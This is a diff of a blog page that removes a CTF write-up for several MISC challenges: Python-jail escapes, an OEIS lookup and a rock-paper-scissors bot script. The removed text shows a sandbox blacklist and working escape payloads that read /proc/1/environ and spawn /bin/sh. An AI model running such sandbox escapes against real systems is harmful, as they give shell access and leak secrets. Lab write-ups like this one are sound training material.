-<p><img src="/2023/12/27/qiangwangbei/image-20231219000032765-1707064057755-10.png" alt="image-20231219000032765"></p>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Pyjail-It’s-myFILTER"><a href="#Pyjail-It’s-myFILTER" class="headerlink" title="Pyjail ! It’s myFILTER !!!"></a>Pyjail ! It’s myFILTER !!!</h3><p>源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># Python Version:python3.10</span><br><span class="line"># Source Code:</span><br><span class="line"></span><br><span class="line">import code, os, subprocess</span><br><span class="line">import pty</span><br><span class="line">def blacklist_fun_callback(*args):</span><br><span class="line">    print(&quot;Player! It&#x27;s already banned!&quot;)</span><br><span class="line"></span><br><span class="line">pty.spawn = blacklist_fun_callback</span><br><span class="line">os.system = blacklist_fun_callback</span><br><span class="line">os.popen = blacklist_fun_callback</span><br><span class="line">subprocess.Popen = blacklist_fun_callback</span><br><span class="line">subprocess.call = blacklist_fun_callback</span><br><span class="line">code.interact = blacklist_fun_callback</span><br><span class="line">code.compile_command = blacklist_fun_callback</span><br><span class="line"></span><br><span class="line">vars = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line">dir = blacklist_fun_callback</span><br><span class="line">getattr = blacklist_fun_callback</span><br><span class="line">exec = blacklist_fun_callback</span><br><span class="line">__import__ = blacklist_fun_callback</span><br><span class="line">compile = blacklist_fun_callback</span><br><span class="line">breakpoint = blacklist_fun_callback</span><br><span class="line"></span><br><span class="line">del os, subprocess, code, pty, blacklist_fun_callback</span><br><span class="line">input_code = input(&quot;Can u input your code to escape &gt; &quot;)</span><br><span class="line"></span><br><span class="line">blacklist_words = [</span><br><span class="line">    &quot;subprocess&quot;,</span><br><span class="line">    &quot;os&quot;,</span><br><span class="line">    &quot;code&quot;,</span><br><span class="line">    &quot;interact&quot;,</span><br><span class="line">    &quot;pty&quot;,</span><br><span class="line">    &quot;pdb&quot;,</span><br><span class="line">    &quot;platform&quot;,</span><br><span class="line">    &quot;importlib&quot;,</span><br><span class="line">    &quot;timeit&quot;,</span><br><span class="line">    &quot;imp&quot;, </span><br><span class="line">    &quot;commands&quot;,</span><br><span class="line">    &quot;popen&quot;,</span><br><span class="line">    &quot;load_module&quot;,</span><br><span class="line">    &quot;spawn&quot;,</span><br><span class="line">    &quot;system&quot;,</span><br><span class="line">    &quot;/bin/sh&quot;,</span><br><span class="line">    &quot;/bin/bash&quot;,</span><br><span class="line">    &quot;flag&quot;,</span><br><span class="line">    &quot;eval&quot;,</span><br><span class="line">    &quot;exec&quot;,</span><br><span class="line">    &quot;compile&quot;,</span><br><span class="line">    &quot;input&quot;,</span><br><span class="line">    &quot;vars&quot;,</span><br><span class="line">    &quot;attr&quot;,</span><br><span class="line">    &quot;dir&quot;,</span><br><span class="line">    &quot;getattr&quot;</span><br><span class="line">    &quot;__import__&quot;,</span><br><span class="line">    &quot;__builtins__&quot;,</span><br><span class="line">    &quot;__getattribute__&quot;,</span><br><span class="line">    &quot;__class__&quot;,</span><br><span class="line">    &quot;__base__&quot;,</span><br><span class="line">    &quot;__subclasses__&quot;,</span><br><span class="line">    &quot;__getitem__&quot;,</span><br><span class="line">    &quot;__self__&quot;,</span><br><span class="line">    &quot;__globals__&quot;,</span><br><span class="line">    &quot;__init__&quot;,</span><br><span class="line">    &quot;__name__&quot;,</span><br><span class="line">    &quot;__dict__&quot;,</span><br><span class="line">    &quot;._module&quot;,</span><br><span class="line">    &quot;builtins&quot;,</span><br><span class="line">    &quot;breakpoint&quot;,</span><br><span class="line">    &quot;import&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def my_filter(input_code):</span><br><span class="line">    for x in blacklist_words:</span><br><span class="line">        if x in input_code:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">while &#x27;&#123;&#x27; in input_code and &#x27;&#125;&#x27; in input_code and input_code.isascii() and my_filter(input_code) and &quot;eval&quot; not in input_code and len(input_code) &lt; 65:</span><br><span class="line">    input_code = eval(f&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Player! Please obey the filter rules which I set!&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>直接打</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;&#125;&#x27; + print(open(&#x27;/proc/1/environ&#x27;).read()) #</span><br></pre></td></tr></table></figure>
-
-<h3 id="Pyjail-It’s-myRevenge"><a href="#Pyjail-It’s-myRevenge" class="headerlink" title="Pyjail ! It’s myRevenge !!!"></a>Pyjail ! It’s myRevenge !!!</h3><p>题目源码</p>
-<p>第一步清除 blacklist，然后用 input 读入继续打</p>
-<table>
-<thead>
-<tr>
-<th><code>1 2 3 </code></th>
-<th><code>&#123;[list(globals().values())[-2].clear(),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[globals()[&quot;__builtins__&quot;].exec(&quot;import os&quot;),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[os.spawnv(0, &quot;/bin/sh&quot;, [&quot;sh&quot;]),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; </code></th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h3 id="Pyjail-It’s-myAST"><a href="#Pyjail-It’s-myAST" class="headerlink" title="Pyjail ! It’s myAST !!!!"></a>Pyjail ! It’s myAST !!!!</h3><p>题目源码，远程环境为 python 3.11</p>
-<p>python 3.10 开始引入了 <code>match</code> 关键字，可以用 <code>match</code> 获取对象属性，用 unicode <code>﹍</code> 绕过下划线检测，用 <code>bytes</code> 转字符串和 <code>len</code> 构造数字绕过 ast 中的禁止常量，使用海象运算符绕过赋值，减小 payload 长度，虽然 1800 够用了 （</p>
-<h3 id="一-SpeedUp"><a href="#一-SpeedUp" class="headerlink" title="一.SpeedUp"></a>一.SpeedUp</h3><p><img src="/image-20231219005108031-1707064057755-11.png" alt="image-20231219005108031">在这个网站直接记载了2的27次方的阶乘的每一位数字之和</p>
-<p>A244060 - OEIS</p>
-<p><img src="/image-20231219005038815-1707064057755-12.png" alt="image-20231219005038815"></p>
-<p>对4495662081取个sha256即可 </p>
-<p>flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}</p>
-<h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>他是贝叶斯预测，然后手搓序列，每次贝叶斯的预测的应该差不多，可以看最后一次结果，然后序列中改成赢过AI的出法加入序列，按照这个规律改就可以把分数逐步上升，最后达到260分拿到flag</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 - 石头，1 - 剪刀，2 - 布</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.133.72&#x27;</span>,<span class="number">25458</span>)</span><br><span class="line"></span><br><span class="line">opponent_choice = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opponent_choice)):</span><br><span class="line">    d = p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(opponent_choice[i]).encode())</span><br><span class="line">    r = p.recv()</span><br><span class="line">    score = re.findall(<span class="string">r&#x27;你的分数： (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line">    <span class="keyword">if</span> score != []:</span><br><span class="line">        <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">d = p.recv()</span><br><span class="line"><span class="built_in">print</span>(d.decode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r = p.recv()</span><br><span class="line"><span class="built_in">print</span>(r.decode())</span><br><span class="line">score = re.findall(<span class="string">r&#x27;你的分数： (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line"><span class="keyword">if</span> score != []:</span><br><span class="line">    <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(opponent_choice))+<span class="string">&#x27;/100&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1316,21 +1336,21 @@
     <img class="site-author-image" itemprop="image" alt="chleynx"
       src="/images/ch.jpg">
   <p class="site-author-name" itemprop="name">chleynx</p>
-  <div class="site-description" itemprop="description">不是看到希望才坚持，而是坚持了才能看到希望</div>
+  <div class="site-description" itemprop="description">Record my study life</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
